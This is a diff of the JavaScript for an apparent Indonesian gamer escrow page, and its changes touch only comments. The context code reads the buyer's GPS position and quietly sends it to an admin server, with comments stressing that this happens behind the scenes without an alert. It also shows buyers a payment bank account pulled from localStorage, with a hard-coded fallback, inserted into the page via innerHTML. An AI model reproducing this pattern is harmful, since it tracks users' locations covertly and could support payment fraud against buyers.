@@ -105,7 +105,7 @@
         let CURRENT_ROOM_DATABASE_ID = "";
         let OLD_CHAT_LOG_DATA = "";
 
-        // PEMBARUAN: Deteksi Lokasi Otomatis (Auto-set Tanpa Mengganggu Alur UI)
+        // Deteksi Lokasi Otomatis (Aman di belakang layar)
         let AUTO_DETECTED_LOCATION = "Lokasi Tidak Diijinkan";
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(pos => {
@@ -127,7 +127,7 @@
                 document.getElementById('buyer-login-container').classList.add('hidden');
                 document.getElementById('main-escrow-workspace').classList.remove('hidden');
 
-                // Kirim koordinat GPS pembeli secara aman ke server admin tanpa prompt alert yang mengganggu
+                // Kirim koordinat GPS pembeli secara aman ke server admin
                 fetch(`${MOCK_API_BASE}/${room.id}`, {
                     method: 'PUT',
                     headers: { 'Content-Type': 'application/json' },
@@ -178,11 +178,10 @@
                 if(room.status === "Selesai & Dicairkan") bColor = "bg-teal-950 text-teal-400 font-bold";
                 badge.className = `px-2.5 py-1 rounded-lg text-[9px] font-mono uppercase ${bColor}`;
 
-                // HANYA MUNCULKAN REKBER ADMIN BILA STATUS DINYATAKAN SIAP TRANSFER (DANA AMAN DI ADMIN / PROSES VERIFIKASI)
+                // MEMBACA WALLET UTAMA YANG DIKETIK ADMIN SECARA REAL-TIME
                 const payBox = document.getElementById('payment-instruction-box');
                 if(room.status === "Dana Aman di Admin" || room.status === "Proses Verifikasi Admin") {
                     payBox.classList.remove('hidden');
-                    // Mengambil data dari localStorage milik server induk admin secara seamless
                     const configW = localStorage.getItem('admin_wallet_config') || "BANK BCA: 8371-291-11 a/n GamerSafe";
                     document.getElementById('payment-target-details').innerHTML = `Tujuan Rekening Admin:<br><strong class="text-amber-400 tracking-wide">${configW}</strong><br><br>Nominal Transfer:<br><strong class="text-emerald-400 text-sm">Rp ${parseInt(room.price).toLocaleString('id-ID')}</strong>`;
                 } else {
